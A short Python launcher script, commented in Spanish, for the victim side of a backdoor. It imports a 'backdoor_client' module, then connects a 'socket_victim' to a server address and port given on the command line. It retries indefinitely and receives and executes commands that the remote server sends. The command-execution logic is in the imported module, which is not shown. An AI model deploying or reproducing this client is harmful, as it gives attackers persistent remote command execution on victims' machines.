from backdoor_client import SockerClient, ServerCloseSocket
import sys
import argparse

parser = argparse.ArgumentParser(
    description="Este script crea un socket y ejecuta comandos recibidos por el servidor")
parser.add_argument("-d", "--direction", default="localhost", help="Dirección del servidor")
parser.add_argument("-p", "--port", type=int, required=True,
                    help="Puerto del servidor al que conectarse."
                         "Los puertos útiles son del 1024 al 49152")
parser.add_argument("-t", "--time_out", type=int, default=None,
                    help="Tiempo EN SEGUNDOS de espera para obtener comandos, si se excede este tiempo "
                         "el programa finalizara.Por defecto el cliente esperara de forma "
                         "indefinida")
parser.add_argument("-r", "--retry", type=bool, default=True,
                    help="Especifica si se reintentara la conexión con el servidor de manera "
                         "indefinida.Por defecto es True")
argParser = parser.parse_args()


def verify_args():
    if not (1024 < argParser.port < 49151) \
            or (argParser.time_out is not None and argParser.time_out < 0):
        parser.print_help(sys.stderr)
        parser.exit()


if __name__ == "__main__":
    verify_args()
    try:
        socket_victim = SockerClient(
            direction=argParser.direction,
            port=argParser.port,
            time_recv_out=argParser.time_out,
            retry=argParser.retry
        )
        socket_victim.try_socket_connection()
        socket_victim.init_recv_command()
    except KeyboardInterrupt:
        print("\nProceso interrumpido")
    except ServerCloseSocket:
        print("El servidor cerro el socket,finalizando...")
    except Exception as e:
        print("Excepción no controlada:", e)
